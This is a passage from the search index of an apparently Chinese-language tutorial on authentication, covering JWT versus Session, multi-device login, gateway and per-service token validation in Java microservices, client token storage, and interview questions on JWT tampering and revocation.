\u4e0d\u53ef\u53d8\u539f\u5219\n   - Token\u7b7e\u53d1\u540e\u65e0\u6cd5\u4fee\u6539\n   - \u9700\u8981\u66f4\u65b0\u4fe1\u606f\u65f6\u91cd\u65b0\u7b7e\u53d1\n\n3. \u516c\u5f00\u6027\u539f\u5219\n   - Payload\u53ef\u88ab\u4efb\u4f55\u4eba\u89e3\u7801\n   - \u4e0d\u8981\u5b58\u653e\u654f\u611f\u4fe1\u606f\n\n4. \u6807\u51c6\u5316\u539f\u5219\n   - \u4f18\u5148\u4f7f\u7528\u6807\u51c6Claims\n   - \u81ea\u5b9a\u4e49Claims\u547d\u540d\u89c4\u8303\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4_1","title":"4. \u591a\u7aef\u767b\u5f55\u7ba1\u7406","text":"<p>\u573a\u666f1\uff1a\u5355\u8bbe\u5907\u767b\u5f55\uff08\u8e22\u51fa\u65e7\u8bbe\u5907\uff09</p> <pre><code>public String login(String username, String password, String deviceId) {\n    // 1. \u9a8c\u8bc1\u51ed\u8bc1\n    User user = authenticate(username, password);\n\n    // 2. \u64a4\u9500\u8be5\u7528\u6237\u6240\u6709\u65e7Token\n    refreshTokenRepository.revokeAllByUserId(user.getId());\n\n    // 3. \u751f\u6210\u65b0Token\n    String accessToken = generateAccessToken(user);\n    String refreshToken = generateRefreshToken(user, deviceId);\n\n    // 4. \u4fdd\u5b58\u65b0Refresh Token\n    saveRefreshToken(user.getId(), refreshToken, deviceId);\n\n    return accessToken;\n}\n</code></pre> <p>\u573a\u666f2\uff1a\u591a\u8bbe\u5907\u767b\u5f55\uff08\u9650\u5236\u6570\u91cf\uff09</p> <pre><code>public String login(String username, String password, String deviceId) {\n    User user = authenticate(username, password);\n\n    // \u83b7\u53d6\u7528\u6237\u5f53\u524d\u6d3b\u8dc3\u8bbe\u5907\u6570\n    List&lt;RefreshToken&gt; activeTokens = refreshTokenRepository\n        .findActiveByUserId(user.getId());\n\n    // \u9650\u5236\u6700\u591a3\u4e2a\u8bbe\u5907\u540c\u65f6\u767b\u5f55\n    if (activeTokens.size() &gt;= 3) {\n        // \u64a4\u9500\u6700\u65e9\u767b\u5f55\u7684\u8bbe\u5907\n        RefreshToken oldest = activeTokens.get(0);\n        oldest.setRevoked(true);\n        refreshTokenRepository.save(oldest);\n    }\n\n    // \u751f\u6210\u65b0Token\n    return generateTokens(user, deviceId);\n}\n</code></pre> <p>\u573a\u666f3\uff1a\u4e0d\u540c\u8bbe\u5907\u4e0d\u540c\u6743\u9650</p> <pre><code>// \u79fb\u52a8\u8bbe\u5907Token\n{\n  \"sub\": \"user-123\",\n  \"device_type\": \"mobile\",\n  \"device_id\": \"iPhone-12-abc\",\n  \"roles\": [\"user\"],\n  \"permissions\": [\"read\", \"write\"],\n  \"exp\": 1735775400  // 7\u5929\n}\n\n// Web\u8bbe\u5907Token\n{\n  \"sub\": \"user-123\",\n  \"device_type\": \"web\",\n  \"device_id\": \"browser-session-xyz\",\n  \"roles\": [\"user\", \"admin\"],  // Web\u7aef\u6709admin\u6743\u9650\n  \"permissions\": [\"read\", \"write\", \"delete\"],\n  \"exp\": 1735686900  // 15\u5206\u949f\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#27-jwt","title":"2.7 JWT\u5728\u5fae\u670d\u52a1\u4e2d\u7684\u5e94\u7528","text":"<p>\u67b6\u6784\u6a21\u5f0f\uff1a</p> <pre><code>                            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                            \u2502   API Gateway   \u2502\n                            \u2502  (Token\u9a8c\u8bc1)    \u2502\n                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                     \u2502\n                \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                \u2502                    \u2502                    \u2502\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502 User Service\u2502      \u2502Order Service\u2502      \u2502Product Service\u2502\n         \u2502  (\u9a8c\u8bc1Token)\u2502      \u2502  (\u9a8c\u8bc1Token)\u2502      \u2502  (\u9a8c\u8bc1Token)\u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u65b9\u68481\uff1a\u7f51\u5173\u7edf\u4e00\u9a8c\u8bc1\uff08\u63a8\u8350\uff09</p> <pre><code>/**\n * API\u7f51\u5173Token\u9a8c\u8bc1\n */\n@Component\npublic class JWTGatewayFilter implements GlobalFilter {\n\n    @Override\n    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        // 1. \u63d0\u53d6Token\n        String token = extractToken(exchange.getRequest());\n\n        if (token == null) {\n            return unauthorized(exchange);\n        }\n\n        try {\n            // 2. \u9a8c\u8bc1Token\n            Claims claims = jwtService.validateToken(token);\n\n            // 3. \u5c06\u7528\u6237\u4fe1\u606f\u4f20\u9012\u7ed9\u4e0b\u6e38\u670d\u52a1\uff08\u901a\u8fc7Header\uff09\n            ServerHttpRequest request = exchange.getRequest().mutate()\n                .header(\"X-User-Id\", claims.getSubject())\n                .header(\"X-User-Roles\", String.join(\",\", claims.getRoles()))\n                .build();\n\n            // 4. \u7ee7\u7eed\u5904\u7406\n            return chain.filter(exchange.mutate().request(request).build());\n\n        } catch (JwtException e) {\n            return unauthorized(exchange);\n        }\n    }\n}\n\n/**\n * \u4e0b\u6e38\u5fae\u670d\u52a1\u4eceHeader\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n */\n@RestController\npublic class UserController {\n\n    @GetMapping(\"/api/user/profile\")\n    public UserProfile getProfile(\n        @RequestHeader(\"X-User-Id\") String userId,\n        @RequestHeader(\"X-User-Roles\") String roles\n    ) {\n        // \u76f4\u63a5\u4f7f\u7528\u7528\u6237\u4fe1\u606f\uff0c\u65e0\u9700\u518d\u6b21\u9a8c\u8bc1Token\n        return userService.getProfile(userId);\n    }\n}\n</code></pre> <p>\u65b9\u68482\uff1a\u6bcf\u4e2a\u670d\u52a1\u72ec\u7acb\u9a8c\u8bc1\uff08\u9ad8\u5b89\u5168\u8981\u6c42\uff09</p> <pre><code>/**\n * \u5fae\u670d\u52a1\u5185\u90e8Token\u9a8c\u8bc1\n */\n@Component\npublic class JWTAuthenticationFilter extends OncePerRequestFilter {\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request, \n                                    HttpServletResponse response,\n                                    FilterChain chain) throws ServletException, IOException {\n        String token = extractToken(request);\n\n        if (token != null) {\n            try {\n                // \u6bcf\u4e2a\u670d\u52a1\u72ec\u7acb\u9a8c\u8bc1Token\n                Claims claims = jwtService.validateToken(token);\n\n                // \u8bbe\u7f6e\u8ba4\u8bc1\u4e0a\u4e0b\u6587\n                Authentication auth = new JWTAuthentication(claims);\n                SecurityContextHolder.getContext().setAuthentication(auth);\n\n            } catch (JwtException e) {\n                // Token\u65e0\u6548\n            }\n        }\n\n        chain.doFilter(request, response);\n    }\n}\n</code></pre> <p>\u65b9\u68483\uff1a\u670d\u52a1\u95f4\u8c03\u7528Token\u4f20\u9012</p> <pre><code>/**\n * \u4f7f\u7528Feign\u4f20\u9012Token\n */\n@FeignClient(name = \"order-service\")\npublic interface OrderServiceClient {\n\n    @GetMapping(\"/api/orders/{id}\")\n    Order getOrder(@PathVariable String id);\n}\n\n/**\n * Feign\u62e6\u622a\u5668\u81ea\u52a8\u6dfb\u52a0Token\n */\n@Component\npublic class FeignTokenInterceptor implements RequestInterceptor {\n\n    @Override\n    public void apply(RequestTemplate template) {\n        // \u4ece\u5f53\u524d\u8bf7\u6c42\u4e0a\u4e0b\u6587\u83b7\u53d6Token\n        ServletRequestAttributes attributes = \n            (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\n\n        if (attributes != null) {\n            HttpServletRequest request = attributes.getRequest();\n            String token = request.getHeader(\"Authorization\");\n\n            // \u4f20\u9012\u7ed9\u4e0b\u6e38\u670d\u52a1\n            if (token != null) {\n                template.header(\"Authorization\", token);\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3-session-vs-jwt","title":"3. Session vs JWT \u6df1\u5ea6\u5bf9\u6bd4","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_11","title":"\u8be6\u7ec6\u5bf9\u6bd4\u8868","text":"\u7ef4\u5ea6 Session JWT \u72b6\u6001\u5b58\u50a8 \u670d\u52a1\u5668\u7aef\uff08\u6709\u72b6\u6001\uff09 \u5ba2\u6237\u7aef\uff08\u65e0\u72b6\u6001\uff09 \u6269\u5c55\u6027 \u5dee\uff08\u9700Session\u5171\u4eab\uff09 \u4f18\u79c0\uff08\u5929\u7136\u652f\u6301\u5206\u5e03\u5f0f\uff09 \u670d\u52a1\u5668\u538b\u529b \u9ad8\uff08\u5b58\u50a8+\u67e5\u8be2\uff09 \u4f4e\uff08\u53ea\u9700\u9a8c\u8bc1\u7b7e\u540d\uff09 Token\u5927\u5c0f \u5c0f\uff0832-128\u5b57\u8282\uff09 \u5927\uff08\u901a\u5e38200-1000\u5b57\u8282\uff09 \u6027\u80fd \u8f83\u6162\uff08\u9700\u67e5\u8be2\u5b58\u50a8\uff09 \u5feb\uff08\u672c\u5730\u9a8c\u8bc1\uff09 \u64a4\u9500\u80fd\u529b \u5bb9\u6613\uff08\u5220\u9664Session\uff09 \u56f0\u96be\uff08\u9700\u9ed1\u540d\u5355\u6216\u77ed\u671fToken\uff09 \u8de8\u57df\u652f\u6301 \u53d7\u9650\uff08Cookie\u540c\u6e90\u7b56\u7565\uff09 \u4f18\u79c0\uff08Header\u4f20\u9012\uff09 \u79fb\u52a8\u7aef\u53cb\u597d \u8f83\u5dee\uff08Cookie\u7ba1\u7406\u590d\u6742\uff09 \u4f18\u79c0\uff08Header\u7075\u6d3b\uff09 \u5b9e\u73b0\u590d\u6742\u5ea6 \u7b80\u5355 \u4e2d\u7b49 \u5b89\u5168\u98ce\u9669 Session\u52ab\u6301 Token\u6cc4\u9732\u3001\u91cd\u653e\u653b\u51fb \u4fe1\u606f\u5bb9\u91cf \u5927\uff08\u670d\u52a1\u5668\u7aef\u5b58\u50a8\uff09 \u5c0f\uff08\u9700\u63a7\u5236Token\u5927\u5c0f\uff09 \u9002\u7528\u67b6\u6784 \u5355\u4f53\u3001\u5c0f\u578b\u5206\u5e03\u5f0f \u5fae\u670d\u52a1\u3001RESTful API"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_12","title":"\u573a\u666f\u9009\u62e9\u6307\u5357","text":"<pre><code>\u9009\u62e9Session\u7684\u573a\u666f\uff1a\n\u2705 \u5355\u4f53\u5e94\u7528\u6216\u5c0f\u578b\u5206\u5e03\u5f0f\u7cfb\u7edf\n\u2705 \u9700\u8981\u9891\u7e41\u64a4\u9500\u4f1a\u8bdd\n\u2705 \u9700\u8981\u5b58\u50a8\u5927\u91cf\u4f1a\u8bdd\u6570\u636e\n\u2705 \u4f20\u7edfWeb\u5e94\u7528\uff08\u670d\u52a1\u5668\u7aef\u6e32\u67d3\uff09\n\u2705 \u9ad8\u5ea6\u5185\u7f51\u73af\u5883\n\n\u9009\u62e9JWT\u7684\u573a\u666f\uff1a\n\u2705 \u5fae\u670d\u52a1\u67b6\u6784\n\u2705 RESTful API\n\u2705 \u79fb\u52a8\u5e94\u7528 + \u540e\u7aefAPI\n\u2705 SPA\uff08\u5355\u9875\u5e94\u7528\uff09\n\u2705 \u8de8\u57df\u5e94\u7528\n\u2705 \u7b2c\u4e09\u65b9API\u96c6\u6210\n\n\u6df7\u5408\u65b9\u6848\uff1a\n\u2705 Session\uff08Web\u7aef\uff09 + JWT\uff08\u79fb\u52a8\u7aefAPI\uff09\n\u2705 JWT\uff08Access Token\uff09 + Session\uff08Refresh Token\uff09\n\u2705 \u5916\u90e8\u7528\u6237\uff08JWT\uff09 + \u5185\u90e8\u5458\u5de5\uff08Session\uff09\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4_2","title":"4. \u5b9e\u9645\u5e94\u7528\u573a\u666f\u6848\u4f8b","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1websession","title":"\u573a\u666f1\uff1a\u5355\u4f53Web\u5e94\u7528\uff08Session\u65b9\u6848\uff09","text":"<p>\u6280\u672f\u6808\uff1a <pre><code>\u524d\u7aef\uff1a\u4f20\u7edfJSP/Thymeleaf\uff08\u670d\u52a1\u5668\u7aef\u6e32\u67d3\uff09\n\u540e\u7aef\uff1aSpring Boot + Spring Session\n\u5b58\u50a8\uff1aRedis\n</code></pre></p> <p>\u914d\u7f6e\uff1a <pre><code># application.yml\nspring:\n  session:\n    store-type: redis  # Session\u5b58\u50a8\u5230Redis\n    timeout: 30m       # 30\u5206\u949f\u8d85\u65f6\n    redis:\n      namespace: myapp:session\n\nserver:\n  servlet:\n    session:\n      cookie:\n        http-only: true\n        secure: true\n        same-site: strict\n</code></pre></p> <p>\u4f18\u52bf\uff1a - \u5b9e\u73b0\u7b80\u5355\uff0cSpring\u81ea\u52a8\u7ba1\u7406 - \u6613\u4e8e\u64a4\u9500Session - \u9002\u5408\u4f20\u7edfWeb\u5e94\u7528</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2spajwt","title":"\u573a\u666f2\uff1aSPA\u5e94\u7528\uff08JWT\u65b9\u6848\uff09","text":"<p>\u6280\u672f\u6808\uff1a <pre><code>\u524d\u7aef\uff1aVue.js/React\uff08\u5ba2\u6237\u7aef\u6e32\u67d3\uff09\n\u540e\u7aef\uff1aSpring Boot RESTful API\n\u8ba4\u8bc1\uff1aJWT\uff08Access Token + Refresh Token\uff09\n</code></pre></p> <p>Token\u6d41\u7a0b\uff1a <pre><code>// \u524d\u7aef\u4ee3\u7801\nclass AuthService {\n    async login(username, password) {\n        const response = await fetch('/api/auth/login', {\n            method: 'POST',\n            body: JSON.stringify({ username, password }),\n            credentials: 'include'  // \u643a\u5e26Cookie\n        });\n\n        const { access_token, expires_in } = await response.json();\n\n        // Access Token\u5b58\u50a8\u5728\u5185\u5b58\n        this.setAccessToken(access_token, expires_in);\n\n        // Refresh Token\u5728HttpOnly Cookie\u4e2d\uff08\u670d\u52a1\u5668\u8bbe\u7f6e\uff09\n    }\n\n    async request(url, options) {\n        // \u81ea\u52a8\u6dfb\u52a0Access Token\n        const token = this.getAccessToken();\n\n        const response = await fetch(url, {\n            ...options,\n            headers: {\n                ...options.headers,\n                'Authorization': `Bearer ${token}`\n            }\n        });\n\n        // Token\u8fc7\u671f\u65f6\u81ea\u52a8\u5237\u65b0\n        if (response.status === 401) {\n            await this.refreshToken();\n            return this.request(url, options);  // \u91cd\u8bd5\n        }\n\n        return response;\n    }\n}\n</code></pre></p> <p>\u4f18\u52bf\uff1a - \u524d\u540e\u7aef\u5b8c\u5168\u5206\u79bb - \u652f\u6301\u8de8\u57df - \u9002\u5408\u73b0\u4ee3SPA\u67b6\u6784</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3appjwt-refresh-token","title":"\u573a\u666f3\uff1a\u79fb\u52a8App\uff08JWT + Refresh Token\uff09","text":"<p>\u6280\u672f\u6808\uff1a <pre><code>\u5ba2\u6237\u7aef\uff1aiOS/Android\n\u540e\u7aef\uff1aRESTful API\n\u8ba4\u8bc1\uff1aJWT\uff08\u957f\u671fRefresh Token\uff09\n</code></pre></p> <p>Token\u7ba1\u7406\uff1a <pre><code>// Android\u793a\u4f8b\uff08Kotlin\uff09\nclass TokenManager(private val secureStorage: SecureStorage) {\n\n    // Access Token\u5b58\u50a8\u5728\u5185\u5b58\n    private var accessToken: String? = null\n\n    // Refresh Token\u5b58\u50a8\u5728\u52a0\u5bc6\u5b58\u50a8\n    private var refreshToken: String?\n        get() = secureStorage.getString(\"refresh_token\")\n        set(value) = secureStorage.putString(\"refresh_token\", value)\n\n    suspend fun login(username: String, password: String) {\n        val response = authApi.login(username, password)\n\n        accessToken = response.accessToken\n        refreshToken = response.refreshToken  // \u5b58\u50a8\u5230\u52a0\u5bc6\u5b58\u50a8\n    }\n\n    suspend fun getValidAccessToken(): String {\n        // \u68c0\u67e5Access Token\u662f\u5426\u8fc7\u671f\n        if (isAccessTokenExpired()) {\n            // \u4f7f\u7528Refresh Token\u83b7\u53d6\u65b0\u7684Access Token\n            val response = authApi.refresh(refreshToken!!)\n            accessToken = response.accessToken\n        }\n\n        return accessToken!!\n    }\n}\n</code></pre></p> <p>\u4f18\u52bf\uff1a - Refresh Token\u957f\u671f\u6709\u6548\uff0830-90\u5929\uff09 - \u7528\u6237\u4f53\u9a8c\u597d\uff0c\u65e0\u9700\u9891\u7e41\u767b\u5f55 - \u5b89\u5168\u6027\u9ad8\uff08Refresh Token\u53ef\u64a4\u9500\uff09</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4jwt","title":"\u573a\u666f4\uff1a\u5fae\u670d\u52a1\u67b6\u6784\uff08JWT\u7edf\u4e00\u8ba4\u8bc1\uff09","text":"<p>\u67b6\u6784\uff1a <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     JWT      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Client \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502 API Gateway  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2502 (\u9a8c\u8bc1Token)  \u2502\n                         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                \u2502 X-User-Id, X-Roles\n                                \u2502 (\u5185\u90e8\u8c03\u7528\u4e0d\u9700\u8981Token)\n                \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                \u2502               \u2502               \u2502\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502User Service \u2502 \u2502Order Service\u2502 \u2502Payment Service\u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>\u4f18\u52bf\uff1a - \u7f51\u5173\u7edf\u4e00\u9a8c\u8bc1\uff0c\u51cf\u8f7b\u5fae\u670d\u52a1\u538b\u529b - \u65e0\u72b6\u6001\uff0c\u6613\u4e8e\u6269\u5c55 - \u670d\u52a1\u95f4\u8c03\u7528\u65e0\u9700Token\uff08\u5185\u7f51\u4fe1\u4efb\uff09</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#5session-jwt","title":"\u573a\u666f5\uff1a\u6df7\u5408\u65b9\u6848\uff08Session + JWT\uff09","text":"<p>\u5e94\u7528\u573a\u666f\uff1a - \u5185\u90e8\u5458\u5de5\uff1aSession\uff08\u9891\u7e41\u64cd\u4f5c\uff0c\u9700\u8981\u968f\u65f6\u64a4\u9500\uff09 - \u5916\u90e8\u7528\u6237\uff1aJWT\uff08\u5206\u5e03\u5f0f\uff0c\u8de8\u57df\u8bbf\u95ee\uff09</p> <p>\u5b9e\u73b0\uff1a <pre><code>@RestController\npublic class AuthController {\n\n    @PostMapping(\"/auth/employee/login\")\n    public void employeeLogin(HttpSession session, @RequestBody LoginRequest request) {\n        // \u5185\u90e8\u5458\u5de5\u4f7f\u7528Session\n        User user = authenticate(request);\n        session.setAttribute(\"user\", user);\n    }\n\n    @PostMapping(\"/auth/customer/login\")\n    public TokenResponse customerLogin(@RequestBody LoginRequest request) {\n        // \u5916\u90e8\u5ba2\u6237\u4f7f\u7528JWT\n        User user = authenticate(request);\n        String token = jwtService.generateToken(user);\n        return new TokenResponse(token);\n    }\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#5_1","title":"5. \u5e38\u89c1\u9762\u8bd5\u9898","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#q1-sessiontoken","title":"Q1: Session\u548cToken\u7684\u533a\u522b\uff1f","text":"<p>\u56de\u7b54\u8981\u70b9\uff1a <pre><code>\u6838\u5fc3\u533a\u522b\uff1a\n1. \u5b58\u50a8\u4f4d\u7f6e\n   - Session\uff1a\u670d\u52a1\u5668\u7aef\u5b58\u50a8\uff0cSessionID\u5728\u5ba2\u6237\u7aef\n   - Token\uff08JWT\uff09\uff1a\u5ba2\u6237\u7aef\u5b58\u50a8\uff0c\u670d\u52a1\u5668\u4e0d\u5b58\u50a8\n\n2. \u6269\u5c55\u6027\n   - Session\uff1a\u9700\u8981Session\u5171\u4eab\uff08Redis/Sticky Session\uff09\n   - Token\uff1a\u5929\u7136\u652f\u6301\u5206\u5e03\u5f0f\uff0c\u65e0\u72b6\u6001\n\n3. \u64a4\u9500\u80fd\u529b\n   - Session\uff1a\u5bb9\u6613\u64a4\u9500\uff08\u5220\u9664\u5373\u53ef\uff09\n   - Token\uff1a\u96be\u64a4\u9500\uff08\u9700\u8981\u9ed1\u540d\u5355\u6216\u77ed\u671fToken\uff09\n\n4. \u6027\u80fd\n   - Session\uff1a\u9700\u8981\u67e5\u8be2\u5b58\u50a8\uff08Redis/DB\uff09\n   - Token\uff1a\u672c\u5730\u9a8c\u8bc1\u7b7e\u540d\uff0c\u66f4\u5feb\n\n5. \u9002\u7528\u573a\u666f\n   - Session\uff1a\u5355\u4f53\u5e94\u7528\u3001\u9700\u8981\u9891\u7e41\u64a4\u9500\n   - Token\uff1a\u5fae\u670d\u52a1\u3001\u79fb\u52a8\u7aefAPI\u3001\u8de8\u57df\n\n\u9762\u8bd5\u52a0\u5206\u9879\uff1a\n- \u63d0\u5230JWT\u7684\u4e09\u90e8\u5206\u7ed3\u6784\uff08Header.Payload.Signature\uff09\n- \u8bf4\u660eRefresh Token\u673a\u5236\n- \u8bb2\u89e3\u5206\u5e03\u5f0fSession\u89e3\u51b3\u65b9\u6848\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#q2-jwt","title":"Q2: JWT\u5982\u4f55\u9632\u6b62\u88ab\u7be1\u6539\uff1f","text":"<p>\u56de\u7b54\u8981\u70b9\uff1a <pre><code>\u6838\u5fc3\u673a\u5236\uff1a\u6570\u5b57\u7b7e\u540d\n\n1. \u7b7e\u540d\u751f\u6210\uff1a\n   signature = HMAC-SHA256(header + \".\" + payload, secret)\n\n2. \u9a8c\u8bc1\u8fc7\u7a0b\uff1a\n   - \u670d\u52a1\u5668\u6536\u5230JWT\n   - \u91cd\u65b0\u8ba1\u7b97\u7b7e\u540d\uff1aexpectedSig = HMAC(header + payload, secret)\n   - \u5bf9\u6bd4\uff1aexpectedSig == receivedSig\n   - \u4e0d\u5339\u914d\u5219\u62d2\u7edd\n\n3. \u4e3a\u4ec0\u4e48\u5b89\u5168\uff1f\n   - \u653b\u51fb\u8005\u6ca1\u6709secret\uff0c\u65e0\u6cd5\u751f\u6210\u6709\u6548\u7b7e\u540d\n   - \u4fee\u6539Payload\u540e\u7b7e\u540d\u4f1a\u5931\u6548\n   - \u5373\u4f7fPayload\u662fBase64\u7f16\u7801\u53ef\u89c1\uff0c\u4f46\u65e0\u6cd5\u4f2a\u9020\n\n4. \u6ce8\u610f\u4e8b\u9879\uff1a\n   - secret\u5fc5\u987b\u4fdd\u5bc6\n   - \u5efa\u8bae\u4f7f\u7528RS256\uff08\u975e\u5bf9\u79f0\uff09\u66ff\u4ee3HS256\n   - \u9632\u6b62\u7b97\u6cd5\u6df7\u6dc6\u653b\u51fb\uff08alg: none\uff09\n\n\u9762\u8bd5\u52a0\u5206\u9879\uff1a\n- \u533a\u5206\u5bf9\u79f0\u548c\u975e\u5bf9\u79f0\u7b7e\u540d\n- \u63d0\u5230\u5e38\u89c1\u653b\u51fb\u65b9\u5f0f\u548c\u9632\u62a4\n- \u8bf4\u660e\u5bc6\u94a5\u7ba1\u7406\u6700\u4f73\u5b9e\u8df5\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#q3-jwtrevoke","title":"Q3: JWT\u5982\u4f55\u5b9e\u73b0\u64a4\u9500\uff08Revoke\uff09\uff1f","text":"<p>\u56de\u7b54\u8981\u70b9\uff1a <pre><code>\u95ee\u9898\uff1aJWT\u65e0\u72b6\u6001\uff0c\u4e00\u65e6\u7b7e\u53d1\u5c31\u65e0\u6cd5\u64a4\u9500\n\n\u89e3\u51b3\u65b9\u6848\uff1a\n\n1. \u9ed1\u540d\u5355\uff08Blacklist\uff09\n   - \u5c06\u64a4\u9500\u7684jti\u5b58\u50a8\u5728Redis\n   - \u9a8c\u8bc1\u65f6\u68c0\u67e5\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d\n   - \u7f3a\u70b9\uff1a\u5931\u53bb\u65e0\u72b6\u6001\u4f18\u52bf\n\n2. \u77ed\u671fToken\n   - Access Token\uff1a5-15\u5206\u949f\n   - \u5373\u4f7f\u6cc4\u9732\uff0c\u5f71\u54cd\u65f6\u95f4\u4e5f\u5f88\u77ed\n   - \u914d\u5408Refresh Token\u4f7f\u7528\n\n3. Refresh Token\u673a\u5236\uff08\u63a8\u8350\uff09\n   - Access Token\uff1a\u77ed\u671f\uff0c\u4e0d\u53ef\u64a4\u9500\n   - Refresh Token\uff1a\u957f\u671f\uff0c\u53ef\u64a4\u9500\uff08\u5b58\u50a8\u5728DB\uff09\n   - \u64a4\u9500\u65f6\u5220\u9664Refresh Token\uff0cAccess Token\u5f88\u5feb\u8fc7\u671f\n\n4. Token\u7248\u672c\u53f7\n   - Payload\u4e2d\u5305\u542btokenVersion\n   - \u64a4\u9500\u65f6\u589e\u52a0\u7528\u6237\u7684tokenVersion\n   - \u9a8c\u8bc1\u65f6\u5bf9\u6bd4\u7248\u672c\u53f7\n   - \u7f3a\u70b9\uff1a\u9700\u8981\u67e5\u8be2\u6570\u636e\u5e93\n\n\u5b9e\u9645\u9009\u62e9\uff1a\n- \u4f4e\u5b89\u5168\u573a\u666f\uff1a\u77ed\u671fToken\uff08\u6700\u7b80\u5355\uff09\n- \u4e00\u822c\u573a\u666f\uff1aRefresh Token\u673a\u5236\n- \u9ad8\u5b89\u5168\u573a\u666f\uff1a\u9ed1\u540d\u5355 + \u77ed\u671fToken\n\n\u9762\u8bd5\u52a0\u5206\u9879\uff1a\n- \u5bf9\u6bd4\u5404\u65b9\u6848\u4f18\u7f3a\u70b9\n- \u8bf4\u660e\u5b9e\u9645\u9879\u76ee\u4e2d\u7684\u9009\u62e9\u548c\u539f\u56e0\n- \u63d0\u5230\u6ed1\u52a8\u8fc7\u671f\u7b56\u7565\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#q4-refresh-token","title":"Q4: Refresh Token\u7684\u4f5c\u7528\u548c\u5b9e\u73b0\u539f\u7406\uff1f","text":"<p>\u56de\u7b54\u8981\u70b9\uff1a 